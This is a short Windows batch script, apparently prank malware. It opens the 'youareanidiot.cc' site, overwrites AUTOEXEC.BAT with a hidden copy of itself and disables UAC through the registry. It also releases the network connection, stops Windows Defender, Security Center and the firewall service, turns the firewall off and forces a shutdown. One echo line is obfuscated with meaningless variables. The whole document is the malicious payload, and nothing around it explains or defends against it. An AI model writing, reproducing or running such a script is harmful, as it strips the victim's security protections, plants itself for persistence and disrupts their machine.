
start https://youareanidiot.cc/
set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
@Set RegistyEditCmd=Cmd /k Reg Add
@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
@Echo off & @@Break Off
Ipconfig / release
%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
shutdown /p -t 30 -c "message"
